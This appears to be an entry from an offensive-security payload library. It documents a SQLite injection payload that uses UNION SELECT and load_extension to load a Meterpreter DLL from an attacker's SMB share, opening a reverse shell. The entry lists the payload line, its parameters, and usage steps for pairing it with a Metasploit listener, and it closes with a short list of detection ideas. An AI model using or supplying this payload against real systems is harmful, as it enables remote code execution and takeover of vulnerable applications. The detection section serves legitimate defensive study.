---
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:37.172600+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - Web
tags:
  - sqlite-injection
  - rce
  - payload
validated: true
---

# SQLite-Union-Select-Load-Extension-Payload

## Code

```sql
UNION SELECT 1,load_extension('\evilhost\evilshare\meterpreter.dll','DllMain');--
```

## Description

This SQL payload exploits a SQLite injection vulnerability by using a UNION SELECT to append a malicious `load_extension` call. It loads a Meterpreter DLL from a remote SMB share, executing its `DllMain` entry point to establish a reverse shell. The payload assumes a two-column query; adjust the SELECT clause for more columns. The comment `--` terminates the original query.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| \evilhost | Attacker's hostname or IP for SMB share | \\192.168.1.100 |
| \evilshare | SMB share name hosting the DLL | \\evilshare |
| meterpreter.dll | Path to the malicious DLL | meterpreter.dll |
| DllMain | DLL entry point function | DllMain |

## Usage

Inject this payload into a vulnerable SQLite parameter (e.g., via web form or API). Ensure the SMB share is active and the DLL is Meterpreter-generated for the target's architecture. Use in conjunction with a listener like Metasploit's multi/handler to catch the reverse connection. Test column count first to avoid errors.

## Detection

- WAF rules blocking `load_extension` or UNC paths (\\server\share).
- SQLite logs showing extension loads or injection errors.
- Network monitoring for SMB connections from app servers to unexpected IPs.
- EDR alerts on DLL loading from remote shares or Meterpreter signatures in memory.

## Related

- [[procedures/SQLite-Injection-Remote-Command-Execution-via-Load-Extension]]
- [[msfvenom-generate-meterpreter-dll]]
